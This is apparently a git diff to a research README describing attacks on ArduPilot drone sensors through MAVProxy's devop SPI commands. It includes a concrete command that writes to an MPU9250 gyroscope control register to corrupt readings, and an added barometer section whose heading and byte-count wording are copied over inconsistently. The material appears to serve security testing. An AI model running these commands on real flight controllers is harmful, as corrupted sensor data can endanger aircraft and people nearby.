@@ -100,7 +100,7 @@ You can learn how to use the Direct Comms with SPI/I2C bus from the documentatio
 We got such information from NuttX source code. For example, if you want to read data from SPI bus, you can execute a command in the below.
 
 ```bash
-devop read spi (1)name (2)bus (3)address (4)regstart count
+devop read spi (1)name (2)bus (3)address (4)regstart (5)count
 (1) Where name= device name
 (2) bus=spi bus #
 (3) address=device address
@@ -109,10 +109,40 @@ devop read spi (1)name (2)bus (3)address (4)regstart count
 ```
 
 ### How to conduct the gyroscope attack?
-1) Write data on a control register of the MPU9250 gyroscope sensor.
+1) Write data to a control register of the MPU9250 gyroscope sensor.
 
 ```bash
 devop write spi mpu9250 1 4 26 1 11
 ```
 
 2) You might see bad gyroscope sensor data.
+
+## Barometer attack
+### Prerequisite
+1) Connect NSH (NuttShell) on a command window
+```bash
+module load nsh
+nsh start
+```
+
+2) We used <a href="https://ardupilot.org/mavproxy/docs/modules/devop.html" target="_blank">Direct Comms with SPI/I2C bus</a> in ArduPilot.
+You can learn how to use the Direct Comms with SPI/I2C bus from the documentation. You must know the following information to conduct this attack: 1) device name, 2) bus number, and 3) address.
+We got such information from NuttX source code. For example, if you want to read data from SPI bus, you can execute a command in the below.
+
+```bash
+devop read spi (1)name (2)bus (3)address (4)regstart (5)count
+(1) Where name= device name
+(2) bus=spi bus #
+(3) address=device address
+(4) regstart=register to start at 
+(5) count=number of bytes to write
+```
+
+### How to conduct the gyroscope attack?
+1) Read data from registers of the MS5611 barometer sensor.
+
+```bash
+devop read spi ms5611_int 1 3 0 255
+```
+
+2) You might see bad barometer sensor data.
